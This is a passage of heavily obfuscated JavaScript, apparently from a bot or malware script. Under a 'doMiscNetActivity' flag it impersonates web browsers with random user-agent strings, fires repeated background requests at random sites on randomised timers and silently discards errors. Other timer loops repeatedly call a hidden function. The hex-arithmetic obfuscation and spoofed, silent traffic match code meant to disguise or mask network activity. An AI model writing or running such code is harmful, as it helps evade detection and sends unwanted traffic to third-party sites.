      a9(0x0) + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
  for (let k = 0x1caa + -0x2538 + -0x447 * -0x2; k < -0xcd * 0x9 + -0xa96 + 0x61 * 0x2f; k++)
    setTimeout(f, (0x422 * 0x5b + 0xcc2 * -0x13 + 0x64b0) * k * getRandomInt(-0x1ba5 + 0xf8f * 0x2 + -0x378, -0xcf6 + -0x7e3 * 0x4 + 0x189 * 0x1d));
  setInterval(() => {
    f();
    for (let l = 0x1ff3 + -0x7 * 0x515 + 0x74 * 0x8; l < -0x504 + -0xbc4 * -0x2 + 0x8 * -0x250; l++)
      setTimeout(f, (-0x2 * -0xc1af + -0x122cd + 0x89cf) * l * getRandomInt(-0x3 * -0x661 + 0x1522 + -0x2844, -0xa30 + -0x4e * 0x4 + 0x25 * 0x4f));
  }, 0x2 * -0x3619d0 + -0x4361bf + -0xe683df * -0x1);
})()), doFlags['doMiscNetA' + 'ctivity'] && setTimeout(async () => {
  const f = axios['create']({
    'headers': {
      'User-Agent': userAgents['random']()
    }
  });
  f['get'](miscSites['random'](), {
    'timeout': 0x0,
    'headers': {
      'User-Agent': userAgents['random'](),
      'Accept-Encoding': 'none'
    }
  })['catch'](h => {}), setInterval(() => {
    f['get'](miscSites['random'](), {
      'timeout': 0x0,
      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x491 * -0x4 + -0x319 * -0xf + -0x2563) * getRandomInt(-0xa6e + 0xb5 * 0xa + -0x7 * -0x7b, 0x245 * 0xc + 0xf1f * 0x1 + -0x2a56));
}, -0x2 * 0xffa + 0x8d5 + -0x1783 * -0x1);